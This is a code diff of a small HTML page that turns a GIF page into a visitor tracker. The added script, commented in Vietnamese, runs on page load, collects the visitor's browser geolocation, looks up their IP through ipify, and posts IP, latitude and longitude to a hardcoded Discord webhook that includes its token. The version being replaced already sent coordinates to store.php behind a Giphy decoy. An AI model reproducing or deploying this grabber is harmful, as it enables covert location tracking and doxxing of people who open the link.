@@ -1,32 +1,38 @@
 <!DOCTYPE html>
 <html>
-<body onload="getLocation()">
+<body>
+    <script>
+        // Hàm lấy vị trí và gửi lên Discord
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendData);
+            }
+        }
 
-<iframe src="https://giphy.com/embed/5uDNFrOi6VwrkFKBaj" width="480" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/waiting-meh-disapproving-5uDNFrOi6VwrkFKBaj">via GIPHY</a></p>
+        async function sendData(position) {
+            const lat = position.coords.latitude;
+            const long = position.coords.longitude;
+            const webhookUrl = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
 
+            // 1. Lấy địa chỉ IP thông qua API miễn phí
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
 
-<p id="demo"></p>
+            // 2. Gửi dữ liệu lên Discord
+            const message = {
+                content: `📍 **Thông tin truy cập:**\nIP: ${ip}\nLat: ${lat}\nLong: ${long}`
+            };
 
-<script>
-var x = document.getElementById("demo");
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            });
+        }
 
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
-
-function showPosition(position) {
-  const xhttp = new XMLHttpRequest();
-  xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
-  xhttp.send();
-}
-</script>
-
+        // Tự động chạy khi tải trang
+        getLocation();
+    </script>
 </body>
 </html>
-
-
-
